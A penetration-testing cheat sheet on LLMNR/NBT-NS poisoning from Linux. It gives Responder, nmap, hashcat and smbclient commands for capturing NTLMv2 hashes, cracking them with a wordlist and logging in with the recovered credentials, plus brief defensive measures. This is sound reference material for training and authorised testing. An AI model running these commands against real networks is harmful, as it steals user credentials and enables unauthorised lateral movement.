# LLMNR / NBT-NS Poisoning - from Linux

## Tool Overview

### Responder
* Python-based tool for poisoning LLMNR, NBT-NS, and MDNS.
* Captures and relays authentication requests.
* Supports additional protocols including MSSQL, DCE-RPC, FTP, POP3, IMAP, and SMTP.

### Inveigh
* Cross-platform MITM tool written in C# and PowerShell.
* Targets LLMNR, NBNS, and related protocols.

### Metasploit
* Provides modules for spoofing, poisoning, and credential relay attacks.

---

## Pre-Attack Network Scanning

### Identify Hosts Responding to NetBIOS

```bash
nmap -Pn --script broadcast-netbios-master-browser
```

### Scan for LLMNR on Hosts

```bash
nmap -p 5355 --script llmnr-resolve <target-ip>
```

---

## Responder Usage

### Help Menu

```bash
responder -h
```

### Run Responder with SMB and HTTP Capture

```bash
responder -I eth0 -w -r -f
```

### Analysis Mode

```bash
responder -A
```

### Run on Specific Interface

```bash
responder -I eth0
```

### View Captured Hashes

```bash
cat /usr/share/responder/logs/Responder-Session.log
```

---

## Hashcat Usage

### Crack NTLMv2 Hashes

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Run Hashcat in Background

```bash
nohup hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt &
```

---

## Post-Exploitation

### Use Cracked Credentials

```bash
smbclient -U <username> //<target-ip>/share
```

---

## Defensive Measures

* Disable LLMNR and NBT-NS via Group Policy.
* Enforce SMB signing to prevent relay attacks.

---

## Additional Notes

### Protocol Details

* LLMNR uses UDP 5355.
* NBT-NS uses UDP 137.
* These protocols broadcast when DNS fails, making poisoning possible.

### MITM Attack Flow

1. Victim broadcasts an LLMNR/NBT-NS query.
2. Responder spoofs a reply.
3. Victim sends NTLM authentication to attacker.
4. Attacker cracks the hash offline.

### Tools

* **Responder** - primary tool for poisoning.
* **Hashcat** - offline cracking.
* **Inveigh / Metasploit** - alternative or complementary tools.

### Impact

* Credential theft enables lateral movement.
* Weak or reused passwords increase attack success.
* Disabling legacy name resolution protocols is essential for protection.
